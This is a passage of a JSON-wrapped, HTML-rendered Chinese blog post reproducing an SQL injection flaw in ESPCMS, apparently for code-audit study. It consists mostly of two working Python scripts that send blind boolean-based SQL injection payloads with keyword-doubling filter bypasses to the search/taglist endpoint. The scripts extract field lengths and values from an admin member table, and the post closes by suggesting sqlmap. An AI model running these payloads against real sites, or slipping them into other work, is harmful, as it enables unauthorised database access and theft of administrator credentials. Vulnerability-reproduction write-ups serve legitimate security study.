class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    payload <span class=\"token operator\">=</span> <span class=\"token string\">r'or (seleselectct length({0}) frfromom {1} limit 0,1)={2} %23'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">,</span> table_name<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span>\n    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token string\">\"暂无内容\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"爆值\"><a href=\"#爆值\" class=\"headerlink\" title=\"爆值\"></a>爆值</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) \"</span>\nkey_length <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\ncolumn_name <span class=\"token operator\">=</span> <span class=\"token string\">\"id\"</span>\ntable_name <span class=\"token operator\">=</span> <span class=\"token string\">'xxxxxxxadmin_member'</span>\nkey_name <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> key_length <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        payload <span class=\"token operator\">=</span> <span class=\"token string\">r'or ascii(substr((seleselectct {0} frfromom {1} limit 0,1),{2},1))={3} %23'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">,</span> table_name<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"暂无内容\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            key_name <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>key_name<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>查看表中数据相符，这就是整个流程，当然可以直接放在sqlmap里跑</p>\n",
            "tags": [
                "sql",
                "代码审计",
                "漏洞复现"
            ]
        }
    ]
}